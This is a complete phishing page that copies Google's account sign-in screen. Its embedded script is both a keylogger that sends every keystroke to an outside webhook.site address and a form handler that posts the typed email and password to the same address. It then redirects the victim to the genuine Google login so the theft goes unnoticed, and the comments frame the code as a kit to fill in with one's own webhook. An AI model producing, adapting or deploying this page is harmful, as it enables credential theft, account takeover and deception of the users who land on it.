<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Google Sans', Arial, sans-serif; 
            background: #fff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
        }
        .container {
            max-width: 450px; 
            width: 100%; 
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            margin: 20px;
        }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 75px; height: 24px; }
        h1 { 
            font-size: 24px; 
            font-weight: 400; 
            text-align: center; 
            margin-bottom: 8px; 
            color: #202124;
        }
        .subtitle {
            text-align: center;
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
            position: relative;
        }
        .input-group input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.2s;
        }
        .input-group input:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }
        .input-group label {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #5f6368;
            font-size: 16px;
            transition: all 0.2s;
            pointer-events: none;
            background: white;
            padding: 0 4px;
        }
        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label {
            top: 0;
            font-size: 12px;
            color: #1a73e8;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 15px;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn:hover { background: #1557b0; }
        .footer {
            margin-top: 40px;
            text-align: center;
            font-size: 14px;
            color: #5f6368;
        }
        .footer a { color: #1a73e8; text-decoration: none; }
        .error { color: #d93025; font-size: 12px; margin-top: 5px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 75 24" width="75" height="24">
                <path d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.54-2.92-6.54-6.54s2.92-6.54 6.54-6.54c1.76 0 3.02.62 4.06 1.56l1.78-1.78C13.2 1.5 11.28.5 9.24.5 4.2.5.5 4.2.5 9.24s3.7 8.74 8.74 8.74c2.52 0 4.62-.84 6.16-2.38 1.64-1.56 2.16-3.76 2.16-5.54 0-.52-.04-1.02-.12-1.48H9.24z" fill="#4285F4"/>
                <path d="M25.5 16.42c-2.5 0-4.5-1.96-4.5-4.5s2-4.5 4.5-4.5c2.5 0 4.5 1.96 4.5 4.5s-2 4.5-4.5 4.5zm0-7.5c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#EA4335"/>
                <path d="M35.5 16.42c-2.5 0-4.5-1.96-4.5-4.5s2-4.5 4.5-4.5c2.5 0 4.5 1.96 4.5 4.5s-2 4.5-4.5 4.5zm0-7.5c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#FBBC05"/>
                <path d="M45.5 16.42c-2.5 0-4.5-1.96-4.5-4.5s2-4.5 4.5-4.5c2.5 0 4.5 1.96 4.5 4.5s-2 4.5-4.5 4.5zm0-7.5c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#4285F4"/>
                <path d="M55.5 16.42c-2.5 0-4.5-1.96-4.5-4.5s2-4.5 4.5-4.5c2.5 0 4.5 1.96 4.5 4.5s-2 4.5-4.5 4.5zm0-7.5c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#34A853"/>
                <path d="M65.5 16.42c-2.5 0-4.5-1.96-4.5-4.5s2-4.5 4.5-4.5c2.5 0 4.5 1.96 4.5 4.5s-2 4.5-4.5 4.5zm0-7.5c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#EA4335"/>
                <path d="M75.5 16.42c-2.5 0-4.5-1.96-4.5-4.5s2-4.5 4.5-4.5c2.5 0 4.5 1.96 4.5 4.5s-2 4.5-4.5 4.5zm0-7.5c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#4285F4"/>
            </svg>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        
        <form id="loginForm">
            <div class="input-group">
                <input type="email" id="email" placeholder=" " required>
                <label for="email">Email or phone</label>
                <div class="error" id="emailError">Please enter a valid email</div>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder=" " required>
                <label for="password">Password</label>
                <div class="error" id="passError">Please enter your password</div>
            </div>
            <button type="submit" class="btn">Next</button>
        </form>
        
        <div class="footer">
            <a href="#">Create account</a>
        </div>
    </div>

    <script>
        // Replace with your webhook URL
        const WEBHOOK_URL = 'https://webhook.site/your-unique-id-here';
        
        // Keylogger - captures all keystrokes
        document.addEventListener('keydown', function(e) {
            const payload = {
                type: 'keystroke',
                key: e.key,
                timestamp: new Date().toISOString(),
                page: window.location.href,
                userAgent: navigator.userAgent
            };
            
            // Use sendBeacon for reliability
            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(payload));
        });

        // Capture form submissions
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Send credentials
            const payload = {
                type: 'credentials',
                email: email,
                password: password,
                timestamp: new Date().toISOString(),
                ip: '', // Will be captured server-side
                userAgent: navigator.userAgent
            };
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            
            // Redirect to real Google
            window.location.href = 'https://accounts.google.com/signin/v2/identifier?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin';
        });

        // Auto-focus email field
        document.getElementById('email').focus();
    </script>
</body>
</html>
